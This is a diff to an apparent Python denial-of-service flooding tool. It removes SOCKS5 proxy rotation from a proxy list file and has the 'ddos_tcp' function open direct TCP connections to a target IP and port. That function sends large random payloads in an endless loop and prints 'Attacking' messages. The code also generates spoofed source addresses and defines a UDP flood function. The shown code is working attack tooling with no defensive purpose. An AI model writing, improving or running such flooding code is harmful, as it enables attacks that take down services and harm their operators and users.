@@ -92,18 +92,11 @@ source_ips = [
     for _ in range(2000000)  # Increase this number to generate more IP addresses
 ]
 
-proxies = []
-with open('cazzy.txt', 'r') as file:
-    proxies = file.read().splitlines()
 
 def ddos_tcp():
     while True:
         try:
-            proxy_address = random.choice(proxies)
-
-            sock = socks.socksocket()
-            sock.set_proxy(socks.SOCKS5, proxy_address.split(':')[0], int(proxy_address.split(':')[1]))
-
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_ip, target_port))
 
             payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(131072, 262144)))
@@ -114,10 +107,11 @@ def ddos_tcp():
 
             sock.sendall(request.encode())
 
-            print("Attacking", url, "on port", target_port, "from", source_ip, "using TCP with proxy", proxy_address)
+            print("Attacking", url, "on port", target_port, "from", source_ip, "using TCP")
             time.sleep(random.uniform(0.0001, 0.001))
         except:
             pass
+
 
 def ddos_udp():
     while True:
